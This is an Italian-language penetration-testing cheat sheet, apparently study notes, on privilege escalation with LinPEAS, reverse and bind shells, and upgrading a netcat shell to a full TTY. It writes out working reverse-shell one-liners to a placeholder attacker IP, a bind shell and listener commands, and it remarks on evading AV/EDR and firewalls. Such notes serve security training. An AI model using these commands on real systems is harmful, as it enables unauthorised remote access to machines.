# Basics — Privilege Escalation, Shell & TTY

---

## Privilege Escalation

- **LinPEAS / WinPEAS** — Privilege Escalation Awesome Script Suite
  - Cercano password salvate, permessi errati, vuln del SO
  - Possono triggerare AV/EDR — a volte meglio fare manualmente
  - `./linpeas.sh` — genera un report completo

---
## Reverse Shell Generator

https://www.revshells.com/


## Reverse Shell

Il target si connette a te — bypassa i firewall.

```bash
# Sul tuo PC (listener)
nc -lvnp 1234
```

| Flag | Significato |
|------|-------------|
| `-l` | listen |
| `-v` | verbose |
| `-n` | no DNS (più veloce) |
| `-p` | porta |

```bash
# Sul target
bash -c 'bash -i >& /dev/tcp/TUO_IP/1234 0>&1'
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc TUO_IP 1234 >/tmp/f
```

---

## Bind Shell

Il target apre una porta e tu ti connetti.

```bash
# Sul target (apre porta 1234)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

```bash
# Sul tuo PC
nc IP_VITTIMA 1234
```

---

## Upgrade TTY

Dopo aver ottenuto una shell con netcat:

```bash
# 1. Spawn bash con python
python -c 'import pty; pty.spawn("/bin/bash")'

# 2. Ctrl+Z (background shell)

# 3. Sul tuo terminale
stty raw -echo; fg
# Premi Invio 2 volte

# 4. Dimensione terminale (dal tuo PC, nuovo terminale)
echo $TERM
stty size

# 5. Nella shell della vittima
export TERM=xterm-256color
stty rows 40 columns 120
```

---

## Quick Tips

- `cd /tmp` — directory che si svuota al riavvio
- `python3 -m http.server 8000` — file server veloce per trasferire file
